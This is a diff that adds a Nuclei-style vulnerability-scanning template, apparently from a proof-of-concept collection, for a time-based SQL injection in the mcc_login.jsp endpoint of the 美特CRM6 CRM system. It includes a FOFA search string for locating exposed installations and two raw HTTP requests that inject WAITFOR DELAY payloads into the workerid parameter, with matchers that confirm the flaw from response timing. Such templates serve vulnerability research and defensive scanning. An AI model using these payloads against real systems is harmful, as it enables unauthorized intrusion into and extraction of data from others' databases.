@@ -1,0 +1,29 @@
+id: metacrm6-mcc_login-sqli
+info:
+  name: 美特CRM6 mcc_login接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/common/scripts/basic.js"
+      漏洞源于美特CRM6系统mcc_login接口未正确过滤用户输入参数，攻击者可通过构造恶意SQL查询实现数据库敏感信息获取。该缺陷允许远程攻击者在未授权情况下执行任意SQL语句，可能导致数据泄露、篡改或系统权限提升。
+  tags: 美特CRM6
+http:
+- raw:
+  - |
+    GET /si/callcenter/solarun/mcc_login.jsp?workerid=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  - |
+    GET /si/callcenter/solarun/mcc_login.jsp?workerid=1';WAITFOR+DELAY+'0:0:8'--+ HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
